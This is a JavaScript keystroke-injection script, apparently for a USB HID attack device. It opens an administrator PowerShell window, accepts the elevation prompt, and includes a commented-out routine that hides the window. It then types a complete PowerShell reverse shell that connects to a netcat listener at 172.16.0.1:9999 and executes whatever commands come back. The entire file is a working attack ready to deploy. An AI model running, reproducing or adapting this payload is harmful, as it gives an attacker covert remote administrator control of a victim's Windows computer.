// Define the keymap
var locale = "us";

// Netcat listener IP Address
var ip = "172.16.0.1";

// Netcat listener Port
var port = 9999;

// Function to hide the PS running
function hide() {
    type("$t = '[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);");
    press("ENTER");
}

// Reverse shell payload
function popshell(ip, port) {
    type("$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port +");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\n");
    type("while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;");
    type("$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);");
    type("$sendback = (iex $data 2>&1 | Out-String );");
    type("$sendback2 = $sendback + 'PS' + (pwd).Path + '> ';");
    type("$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);");
    type("$stream.Write($sendbyte,0,$sendbyte.Length);");
    type("$stream.Flush()};");
    type("$client.Close();");
    press("ENTER");
}

// Main script
layout(locale);
typingSpeed(0,0);
press("GUI x");
delay(4000);
press("SHIFT a");
delay(8000)
press("ALT j");
delay(3000);
//hide();
delay(2000);
popshell(ip,port);